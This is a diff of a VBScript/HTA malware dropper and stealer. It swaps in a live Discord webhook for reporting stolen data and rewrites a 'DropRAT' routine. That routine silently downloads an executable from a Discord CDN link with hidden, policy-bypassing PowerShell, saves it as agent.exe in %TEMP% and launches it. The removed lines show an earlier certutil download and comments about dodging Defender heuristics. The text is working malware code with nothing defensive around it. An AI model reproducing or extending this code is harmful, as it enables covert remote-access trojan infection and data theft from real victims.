@@ -10,7 +10,7 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' --- WEBHOOK ---
-WH = "https://discordapp.com/api/webhooks/1557496485413781675/FX5fiB-evdnBmtrf5yWkdskxVvFAn4m3pb9O0lWNR-JAqatIikBcSDPwUzeBFh5Vfioo"
+WH = "https://discordapp.com/api/webhooks/1564329308187529359/eFrj6tXHLM0bU-Qz_2a8aLDSYRsp-_qMb1o73PA-3UXkhZ9hxn7WsyNcyj4aZPyNUbLF"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -146,41 +146,52 @@ Sub GrabFroststrap()
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
-' --- DropRAT (Certutil Download & CMD Execution) ---
+' --- DropRAT ---
 Sub DropRAT()
     Call PostEmbed(":package: RAT Download", "Fetching Payload...", 3447003)
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1564347479430930607/1564358699412103249/OnlineDice.exe?ex=6ae0fa12&is=6adfa892&hm=254e760f21325b56861c181ea926a5b68608f1bd6c5cc3237c2370f5dc9ff830&"
     
-    ' REPLACE THIS WITH A PERMANENT LINK (SUPABASE, GITHUB, ETC)
-    Dim dl : dl = "https://uqmzwiaidvfokyfxzolb.supabase.co/storage/v1/object/public/DiscordUpdater/DiscordUpdater.exe"
-    
-    ' Save to APPDATA instead of TEMP to avoid Defender heuristics
-    Dim op : op = sh.ExpandEnvironmentStrings("%APPDATA%") & "\SysCache.exe"
-    
+    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' 1. Download using certutil (bypasses PowerShell download flags)
-    sh.Run "cmd /c certutil -urlcache -split -f """ & dl & """ """ & op & """ > nul 2>&1", 0, True
+    ' Wait = True (blocks until download is 100% complete)
+    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & op & "'""", 0, True
 
-    ' 2. Check if downloaded and large enough
-    If fso.FileExists(op) And fso.GetFile(op).Size > 3000000 Then
-        Call PostEmbed(":rocket: RAT Downloaded", "Size: " & fso.GetFile(op).Size & " bytes", 3447003)
-        
-        ' 3. Set Working Directory to APPDATA so PyInstaller doesn't crash
-        sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%APPDATA%")
-        
-        ' 4. Execute via cmd /c start (detaches process from HTA)
-        sh.Run "cmd.exe /c start """" """ & op & """", 0, False
-        
+    ' Check for 3.71MB (3,890,000 bytes) to ensure it's fully written
+    Dim rDone : rDone = False
+    If fso.FileExists(op) Then
+        If fso.GetFile(op).Size > 3000000 Then
+            rDone = True
+        End If
+    End If
+
+    If rDone Then
+        Dim dsize : dsize = fso.GetFile(op).Size
+        Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003)
+        sh.Run op, 0, False
         Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280)
     Else
-        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or file too small.", 16711680)
+        sh.Run "cmd /c taskkill /f /im powershell.exe > nul 2>&1", 0, False
+        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or incomplete.", 16711680)
     End If
 End Sub
 
-' --- Sleep Functions ---
+' --- Sleep Functions (Timer-Based) ---
 Sub SleepSeconds(s)
+    Dim t0, t1, t2, elapsed
+    t0 = Timer()
     Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
     sh.Run cmd, 0, True
+    elapsed = Timer() - t0
+    If elapsed < 0 Then elapsed = elapsed + 86400
+    If elapsed < s Then
+        t1 = Timer()
+        Do
+            t2 = Timer()
+            If t2 < t1 Then t2 = t2 + 86400
+            If (t2 - t1) >= (s - elapsed) Then Exit Do
+        Loop
+    End If
 End Sub
 
 Sub SleepMinutes(m)
